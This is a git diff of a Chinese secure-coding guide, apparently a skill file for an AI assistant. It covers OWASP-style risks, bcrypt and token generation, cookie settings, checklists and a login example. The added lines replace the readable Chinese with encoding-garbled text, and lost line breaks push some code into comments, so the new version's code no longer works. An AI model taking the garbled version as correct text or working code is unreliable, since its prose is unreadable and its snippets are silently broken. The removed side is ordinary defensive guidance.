+- 涓嶈褰曟晱鎰熶俊鎭?- 鏁版嵁鑴辨晱
 ```
 
-#### 4. XML 外部实体 (XXE)
+#### 4. XML 澶栭儴瀹炰綋 (XXE)
 ```
-风险：读取本地文件、SSRF、DoS
-防护：
-- 禁用 DTD
-- 禁用外部实体
-- 使用 JSON 替代 XML
-```
-
-#### 5. 失效的访问控制 (Broken Access Control)
-```
-风险：越权访问、目录遍历
-防护：
-- 服务端权限验证
-- 最小权限原则
-- 统一的访问控制层
+椋庨櫓锛氳鍙栨湰鍦版枃浠躲€丼SRF銆丏oS
+闃叉姢锛?- 绂佺敤 DTD
+- 绂佺敤澶栭儴瀹炰綋
+- 浣跨敤 JSON 鏇夸唬 XML
 ```
 
-#### 6. 安全配置错误 (Security Misconfiguration)
+#### 5. 澶辨晥鐨勮闂帶鍒?(Broken Access Control)
 ```
-风险：默认配置、详细错误信息、未使用功能
-防护：
-- 删除默认账户
-- 关闭详细错误
-- 禁用未使用功能
-- 定期安全扫描
+椋庨櫓锛氳秺鏉冭闂€佺洰褰曢亶鍘?闃叉姢锛?- 鏈嶅姟绔潈闄愰獙璇?- 鏈€灏忔潈闄愬師鍒?- 缁熶竴鐨勮闂帶鍒跺眰
 ```
 
-#### 7. 跨站脚本 (XSS)
+#### 6. 瀹夊叏閰嶇疆閿欒 (Security Misconfiguration)
 ```
-风险：窃取会话、重定向、键盘记录
-防护：
-- 输出编码
+椋庨櫓锛氶粯璁ら厤缃€佽缁嗛敊璇俊鎭€佹湭浣跨敤鍔熻兘
+闃叉姢锛?- 鍒犻櫎榛樿璐︽埛
+- 鍏抽棴璇︾粏閿欒
+- 绂佺敤鏈娇鐢ㄥ姛鑳?- 瀹氭湡瀹夊叏鎵弿
+```
+
+#### 7. 璺ㄧ珯鑴氭湰 (XSS)
+```
+椋庨櫓锛氱獌鍙栦細璇濄€侀噸瀹氬悜銆侀敭鐩樿褰?闃叉姢锛?- 杈撳嚭缂栫爜
 - Content-Security-Policy
-- 使用框架的自动转义
-- HttpOnly Cookie
+- 浣跨敤妗嗘灦鐨勮嚜鍔ㄨ浆涔?- HttpOnly Cookie
 ```
 
-#### 8. 不安全的反序列化 (Insecure Deserialization)
+#### 8. 涓嶅畨鍏ㄧ殑鍙嶅簭鍒楀寲 (Insecure Deserialization)
 ```
-风险：远程代码执行、权限提升
-防护：
-- 避免反序列化用户数据
-- 使用签名验证完整性
-- 限制反序列化的类
+椋庨櫓锛氳繙绋嬩唬鐮佹墽琛屻€佹潈闄愭彁鍗?闃叉姢锛?- 閬垮厤鍙嶅簭鍒楀寲鐢ㄦ埛鏁版嵁
+- 浣跨敤绛惧悕楠岃瘉瀹屾暣鎬?- 闄愬埗鍙嶅簭鍒楀寲鐨勭被
 ```
 
-#### 9. 使用含有漏洞的组件 (Vulnerable Components)
+#### 9. 浣跨敤鍚湁婕忔礊鐨勭粍浠?(Vulnerable Components)
 ```
-风险：已知漏洞被利用
-防护：
-- 定期更新依赖
-- 使用 SCA 工具扫描
-- 移除不必要的依赖
+椋庨櫓锛氬凡鐭ユ紡娲炶鍒╃敤
+闃叉姢锛?- 瀹氭湡鏇存柊渚濊禆
+- 浣跨敤 SCA 宸ュ叿鎵弿
+- 绉婚櫎涓嶅繀瑕佺殑渚濊禆
 ```
 
-#### 10. 不足的日志记录和监控 (Insufficient Logging & Monitoring)
+#### 10. 涓嶈冻鐨勬棩蹇楄褰曞拰鐩戞帶 (Insufficient Logging & Monitoring)
 ```
-风险：攻击无法追溯、响应延迟
-防护：
-- 记录所有安全事件
-- 设置告警阈值
-- 定期审计日志
-- 与 SIEM 集成
+椋庨櫓锛氭敾鍑绘棤娉曡拷婧€佸搷搴斿欢杩?闃叉姢锛?- 璁板綍鎵€鏈夊畨鍏ㄤ簨浠?- 璁剧疆鍛婅闃堝€?- 瀹氭湡瀹¤鏃ュ織
+- 涓?SIEM 闆嗘垚
 ```
 
 ---
 
-### C2. 安全编码最佳实践
-
-#### 密码存储
+### C2. 瀹夊叏缂栫爜鏈€浣冲疄璺?
+#### 瀵嗙爜瀛樺偍
 ```javascript
-// ✅ 使用 bcrypt
+// 鉁?浣跨敤 bcrypt
 const bcrypt = require('bcrypt');
 const saltRounds = 12;
 const hash = await bcrypt.hash(password, saltRounds);
 const valid = await bcrypt.compare(password, hash);
 
-// ❌ 禁止
-const hash = md5(password);  // 太弱
-const hash = sha256(password);  // 无盐，太弱
-```
+// 鉂?绂佹
+const hash = md5(password);  // 澶急
+const hash = sha256(password);  // 鏃犵洂锛屽お寮?```
 
-#### Token 生成
+#### Token 鐢熸垚
 ```javascript
-// ✅ 使用 crypto 生成安全随机数
-const crypto = require('crypto');
+// 鉁?浣跨敤 crypto 鐢熸垚瀹夊叏闅忔満鏁?const crypto = require('crypto');
 const token = crypto.randomBytes(32).toString('hex');
 
-// ❌ 禁止
-const token = Math.random().toString();  // 可预测
-const token = 'fixed-token';  // 硬编码
-```
+// 鉂?绂佹
+const token = Math.random().toString();  // 鍙娴?const token = 'fixed-token';  // 纭紪鐮?```
 
-#### HTTPS 配置
+#### HTTPS 閰嶇疆
 ```javascript
-// ✅ 强制 HTTPS
+// 鉁?寮哄埗 HTTPS
 app.use((req, res, next) => {
   if (req.header('x-forwarded-proto') !== 'https') {
     res.redirect(`https://${req.header('host')}${req.url}`);
@@ -623,236 +476,197 @@ app.use((req, res, next) => {
   }
 });
 
-// ✅ HSTS
+// 鉁?HSTS
 res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
 ```
 
-#### Cookie 安全
+#### Cookie 瀹夊叏
 ```javascript
-// ✅ 安全配置
+// 鉁?瀹夊叏閰嶇疆
 res.cookie('session', token, {
-  httpOnly: true,      // 禁止 JS 访问
-  secure: true,        // 仅 HTTPS
-  sameSite: 'strict',  // 防止 CSRF
-  maxAge: 3600000      // 1 小时过期
+  httpOnly: true,      // 绂佹 JS 璁块棶
+  secure: true,        // 浠?HTTPS
+  sameSite: 'strict',  // 闃叉 CSRF
+  maxAge: 3600000      // 1 灏忔椂杩囨湡
 });
 
-// ❌ 危险
-res.cookie('session', token);  // 所有保护都没有
+// 鉂?鍗遍櫓
+res.cookie('session', token);  // 鎵€鏈変繚鎶ら兘娌℃湁
 ```
 
 ---
 
-### C3. 安全检查速查表
+### C3. 瀹夊叏妫€鏌ラ€熸煡琛?
+**鍐欎唬鐮佸墠**锛?- [ ] 杩欎釜鍔熻兘鏈変粈涔堝畨鍏ㄩ闄╋紵
+- [ ] 鐢ㄦ埛杈撳叆鍦ㄥ摢閲岋紵
+- [ ] 鏁忔劅鏁版嵁鏈夊摢浜涳紵
 
-**写代码前**：
-- [ ] 这个功能有什么安全风险？
-- [ ] 用户输入在哪里？
-- [ ] 敏感数据有哪些？
+**鍐欎唬鐮佹椂**锛?- [ ] 鐢ㄤ簡鍙傛暟鍖栨煡璇㈠悧锛?- [ ] 杈撳叆楠岃瘉浜嗗悧锛?- [ ] 閿欒浼氭毚闇叉晱鎰熶俊鎭悧锛?- [ ] 鏃ュ織璁板綍瀹夊叏鍚楋紵
 
-**写代码时**：
-- [ ] 用了参数化查询吗？
-- [ ] 输入验证了吗？
-- [ ] 错误会暴露敏感信息吗？
-- [ ] 日志记录安全吗？
-
-**写代码后**：
-- [ ] 过一遍 Module A 检查清单
-- [ ] 过一遍 Module B 恶意检测
-- [ ] 对照 Module C 最佳实践
-
-**上线前**：
-- [ ] npm audit 扫描依赖
-- [ ] 渗透测试
-- [ ] 代码审查
-- [ ] 安全扫描工具
+**鍐欎唬鐮佸悗**锛?- [ ] 杩囦竴閬?Module A 妫€鏌ユ竻鍗?- [ ] 杩囦竴閬?Module B 鎭舵剰妫€娴?- [ ] 瀵圭収 Module C 鏈€浣冲疄璺?
+**涓婄嚎鍓?*锛?- [ ] npm audit 鎵弿渚濊禆
+- [ ] 娓楅€忔祴璇?- [ ] 浠ｇ爜瀹℃煡
+- [ ] 瀹夊叏鎵弿宸ュ叿
 
 ---
 
-## 🛠️ 使用流程
+## 馃洜锔?浣跨敤娴佺▼
 
-### 场景 1：写完代码后自检
-
-```
-1. 运行 Module A 检查清单（逐项对照）
-   ↓
-2. 运行 Module B 恶意检测（排查可疑模式）
-   ↓
-3. 发现问题 → 修复 → 重新检查
-   ↓
-4. 全部通过 → 提交代码
-```
-
-### 场景 2：审查第三方代码
+### 鍦烘櫙 1锛氬啓瀹屼唬鐮佸悗鑷
 
 ```
-1. 先运行 Module B 恶意检测（排除明显危险）
-   ↓
-2. 再运行 Module A 检查清单（逐项审查）
-   ↓
-3. 对照 Module C 评估安全水平
-   ↓
-4. 输出审查报告 + 修复建议
+1. 杩愯 Module A 妫€鏌ユ竻鍗曪紙閫愰」瀵圭収锛?   鈫?2. 杩愯 Module B 鎭舵剰妫€娴嬶紙鎺掓煡鍙枒妯″紡锛?   鈫?3. 鍙戠幇闂 鈫?淇 鈫?閲嶆柊妫€鏌?   鈫?4. 鍏ㄩ儴閫氳繃 鈫?鎻愪氦浠ｇ爜
 ```
 
-### 场景 3：学习安全编程
+### 鍦烘櫙 2锛氬鏌ョ涓夋柟浠ｇ爜
 
 ```
-1. 阅读 Module C 安全规范
-   ↓
-2. 理解每个风险点的原理
-   ↓
-3. 在 Module A/B 中找到对应检查项
-   ↓
-4. 在实际代码中练习
+1. 鍏堣繍琛?Module B 鎭舵剰妫€娴嬶紙鎺掗櫎鏄庢樉鍗遍櫓锛?   鈫?2. 鍐嶈繍琛?Module A 妫€鏌ユ竻鍗曪紙閫愰」瀹℃煡锛?   鈫?3. 瀵圭収 Module C 璇勪及瀹夊叏姘村钩
+   鈫?4. 杈撳嚭瀹℃煡鎶ュ憡 + 淇寤鸿
+```
+
+### 鍦烘櫙 3锛氬涔犲畨鍏ㄧ紪绋?
+```
+1. 闃呰 Module C 瀹夊叏瑙勮寖
+   鈫?2. 鐞嗚В姣忎釜椋庨櫓鐐圭殑鍘熺悊
+   鈫?3. 鍦?Module A/B 涓壘鍒板搴旀鏌ラ」
+   鈫?4. 鍦ㄥ疄闄呬唬鐮佷腑缁冧範
 ```
 
 ---
 
-## 📊 安全等级分类
+## 馃搳 瀹夊叏绛夌骇鍒嗙被
 
-| 等级 | 标识 | 含义 | 行动 |
+| 绛夌骇 | 鏍囪瘑 | 鍚箟 | 琛屽姩 |
 |------|------|------|------|
-| Critical | 🔴 | 严重漏洞，立即修复 | 停止所有工作，立刻修复 |
-| High | 🟠 | 高风险，需要关注 | 尽快修复，不能上线 |
-| Medium | 🟡 | 中等风险，建议修复 | 排期修复 |
-| Low | 🟢 | 低风险，可接受 | 记录，后续优化 |
+| Critical | 馃敶 | 涓ラ噸婕忔礊锛岀珛鍗充慨澶?| 鍋滄鎵€鏈夊伐浣滐紝绔嬪埢淇 |
+| High | 馃煚 | 楂橀闄╋紝闇€瑕佸叧娉?| 灏藉揩淇锛屼笉鑳戒笂绾?|
+| Medium | 馃煛 | 涓瓑椋庨櫓锛屽缓璁慨澶?| 鎺掓湡淇 |
+| Low | 馃煝 | 浣庨闄╋紝鍙帴鍙?| 璁板綍锛屽悗缁紭鍖?|
 
 ---
 
-## 📝 安全检查报告模板
-
+## 馃摑 瀹夊叏妫€鏌ユ姤鍛婃ā鏉?
 ```markdown
-# 代码安全检查报告
+# 浠ｇ爜瀹夊叏妫€鏌ユ姤鍛?
+**鏃ユ湡**: YYYY-MM-DD
+**瀹℃煡浜?*: 鏉板厠
+**瀹℃煡鑼冨洿**: [鏂囦欢/妯″潡鍒楄〃]
 
-**日期**: YYYY-MM-DD
-**审查人**: 杰克
-**审查范围**: [文件/模块列表]
+## 鍙戠幇鐨勯棶棰?
+### 馃敶 Critical (0 涓?
 
-## 发现的问题
+### 馃煚 High (0 涓?
 
-### 🔴 Critical (0 个)
+### 馃煛 Medium (0 涓?
 
-### 🟠 High (0 个)
+### 馃煝 Low (0 涓?
 
-### 🟡 Medium (0 个)
+## 鏁翠綋璇勪及
 
-### 🟢 Low (0 个)
+**瀹夊叏璇勫垎**: X/100
 
-## 整体评估
-
-**安全评分**: X/100
-
-**主要风险**:
+**涓昏椋庨櫓**:
 - ...
 
-**修复建议**:
+**淇寤鸿**:
 1. ...
 2. ...
 
-## 结论
+## 缁撹
 
-- [ ] 可以上线
-- [ ] 需要修复后上线
-- [ ] 需要重大修改
-```
+- [ ] 鍙互涓婄嚎
+- [ ] 闇€瑕佷慨澶嶅悗涓婄嚎
+- [ ] 闇€瑕侀噸澶т慨鏀?```
 
 ---
 
-## 🔗 相关文件
+## 馃敆 鐩稿叧鏂囦欢
 
-| 文件 | 作用 |
+| 鏂囦欢 | 浣滅敤 |
 |------|------|
-| [SKILL.md](../code-quality-workflow/SKILL.md) | 代码质量工作流（包含安全铁律） |
-| [bug-lessons.md](../code-quality-workflow/bug-lessons.md) | Bug 教训记录 |
-| [tech-error-log/](../tech-error-log/SKILL.md) | 技术错误日志 |
+| [SKILL.md](../code-quality-workflow/SKILL.md) | 浠ｇ爜璐ㄩ噺宸ヤ綔娴侊紙鍖呭惈瀹夊叏閾佸緥锛?|
+| [bug-lessons.md](../code-quality-workflow/bug-lessons.md) | Bug 鏁欒璁板綍 |
+| [tech-error-log/](../tech-error-log/SKILL.md) | 鎶€鏈敊璇棩蹇?|
 
 ---
 
-## 💡 使用示例
+## 馃挕 浣跨敤绀轰緥
 
-### 示例：用户登录功能安全检查
-
-**代码**：
-```javascript
+### 绀轰緥锛氱敤鎴风櫥褰曞姛鑳藉畨鍏ㄦ鏌?
+**浠ｇ爜**锛?```javascript
 app.post('/login', async (req, res) => {
   const { username, password } = req.body;
 
-  // 检查 1: 输入验证
+  // 妫€鏌?1: 杈撳叆楠岃瘉
   if (!username || !password) {
-    return res.status(400).json({ error: '缺少用户名或密码' });
+    return res.status(400).json({ error: '缂哄皯鐢ㄦ埛鍚嶆垨瀵嗙爜' });
   }
 
-  // 检查 2: SQL 查询
+  // 妫€鏌?2: SQL 鏌ヨ
   const user = await db.query(
     'SELECT * FROM users WHERE username = ?',
     [username]
   );
 
   if (!user) {
-    return res.status(401).json({ error: '用户名或密码错误' });
+    return res.status(401).json({ error: '鐢ㄦ埛鍚嶆垨瀵嗙爜閿欒' });
   }
 
-  // 检查 3: 密码验证
+  // 妫€鏌?3: 瀵嗙爜楠岃瘉
   const valid = await bcrypt.compare(password, user.passwordHash);
   if (!valid) {
-    return res.status(401).json({ error: '用户名或密码错误' });
+    return res.status(401).json({ error: '鐢ㄦ埛鍚嶆垨瀵嗙爜閿欒' });
   }
 
-  // 检查 4: 生成 Token
+  // 妫€鏌?4: 鐢熸垚 Token
   const token = crypto.randomBytes(32).toString('hex');
 
-  // 检查 5: 记录日志（不记录密码）
-  logger.info('用户登录成功', { userId: user.id, ip: req.ip });
+  // 妫€鏌?5: 璁板綍鏃ュ織锛堜笉璁板綍瀵嗙爜锛?  logger.info('鐢ㄦ埛鐧诲綍鎴愬姛', { userId: user.id, ip: req.ip });
 
-  // 检查 6: 返回结果（不返回敏感信息）
-  res.json({
+  // 妫€鏌?6: 杩斿洖缁撴灉锛堜笉杩斿洖鏁忔劅淇℃伅锛?  res.json({
     token,
     user: { id: user.id, username: user.username }
   });
 });
 ```
 
-**检查结果**：
-```
-✅ 输入验证 - 通过
-✅ SQL 参数化 - 通过
-✅ 密码 bcrypt - 通过
-✅ Token 安全随机 - 通过
-✅ 日志脱敏 - 通过
-✅ 响应脱敏 - 通过
+**妫€鏌ョ粨鏋?*锛?```
+鉁?杈撳叆楠岃瘉 - 閫氳繃
+鉁?SQL 鍙傛暟鍖?- 閫氳繃
+鉁?瀵嗙爜 bcrypt - 閫氳繃
+鉁?Token 瀹夊叏闅忔満 - 閫氳繃
+鉁?鏃ュ織鑴辨晱 - 閫氳繃
+鉁?鍝嶅簲鑴辨晱 - 閫氳繃
 
-安全评分：100/100
+瀹夊叏璇勫垎锛?00/100
 ```
 
 ---
 
-*版本：1.0 | 创建日期：2026-03-09 | 使用者：杰克（Claude）*
+*鐗堟湰锛?.0 | 鍒涘缓鏃ユ湡锛?026-03-09 | 浣跨敤鑰咃細鏉板厠锛圕laude锛?
 
 ---
 
-## 📅 更新历史
+## 馃搮 鏇存柊鍘嗗彶
 
-| 版本 | 日期 | 更新内容 | 原因 |
+| 鐗堟湰 | 鏃ユ湡 | 鏇存柊鍐呭 | 鍘熷洜 |
 |------|------|----------|------|
-| 1.0 | 2026-03-09 | 初始创建 + 三大模块 (A/B/C) | 新技能建立 |
+| 1.0 | 2026-03-09 | 鍒濆鍒涘缓 + 涓夊ぇ妯″潡 (A/B/C) | 鏂版妧鑳藉缓绔?|
 
-*维护指南：参考 skills/SKILL-MAINTENANCE.md*
+*缁存姢鎸囧崡锛氬弬鑰?skills/SKILL-MAINTENANCE.md*
 
-*最后更新：2026-03-09*
+*鏈€鍚庢洿鏂帮細2026-03-09*
 
 ---
 
-## 📜 杰克安全承诺
+## 馃摐 鏉板厠瀹夊叏鎵胯
 
-> 1. **不写危险代码** — 每一行都经得起审查
-> 2. **不存敏感信息** — 密码、密钥永远不硬编码
-> 3. **不忽视输入验证** — 所有用户输入都是不可信的
-> 4. **不暴露错误细节** — 错误信息不泄露系统信息
-> 5. **不跳过安全检查** — Module A/B/C 每次都过
+> 1. **涓嶅啓鍗遍櫓浠ｇ爜** 鈥?姣忎竴琛岄兘缁忓緱璧峰鏌?> 2. **涓嶅瓨鏁忔劅淇℃伅** 鈥?瀵嗙爜銆佸瘑閽ユ案杩滀笉纭紪鐮?> 3. **涓嶅拷瑙嗚緭鍏ラ獙璇?* 鈥?鎵€鏈夌敤鎴疯緭鍏ラ兘鏄笉鍙俊鐨?> 4. **涓嶆毚闇查敊璇粏鑺?* 鈥?閿欒淇℃伅涓嶆硠闇茬郴缁熶俊鎭?> 5. **涓嶈烦杩囧畨鍏ㄦ鏌?* 鈥?Module A/B/C 姣忔閮借繃
 >
-> **安全，是对用户负责，也是对自己负责！**
+> **瀹夊叏锛屾槸瀵圭敤鎴疯礋璐ｏ紝涔熸槸瀵硅嚜宸辫礋璐ｏ紒**
 
 ---
 
-*安全编程，从每一行代码开始！🔒*
+*瀹夊叏缂栫▼锛屼粠姣忎竴琛屼唬鐮佸紑濮嬶紒馃敀*
+
